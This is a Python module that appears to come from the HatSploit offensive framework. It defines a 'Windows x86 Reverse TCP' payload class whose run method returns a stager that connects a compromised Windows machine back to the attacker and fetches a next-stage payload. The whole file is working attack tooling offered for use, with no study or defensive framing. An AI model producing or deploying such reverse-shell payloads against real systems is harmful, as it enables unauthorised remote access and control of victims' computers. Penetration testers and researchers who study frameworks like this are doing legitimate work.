"""
This payload requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from hatsploit.lib.core.payload.basic import *
from hatsploit.lib.core.payload.windows import X86ReverseTCP


class HatSploitPayload(Payload, Handler, X86ReverseTCP):
    def __init__(self):
        super().__init__({
            'Name': "Windows x86 Reverse TCP",
            'Payload': "windows/x86/reverse_tcp",
            'Authors': [
                "Ivan Nikolskiy (enty8080) - payload developer",
            ],
            'Description': (
                "This payload creates an interactive reverse TCP connection for Windows "
                "with x86 architecture and reads next phase."
            ),
            'Arch': ARCH_X86,
            'Platform': OS_WINDOWS,
            'Type': REVERSE_TCP,
        })

    def run(self):
        return self.get_payload()
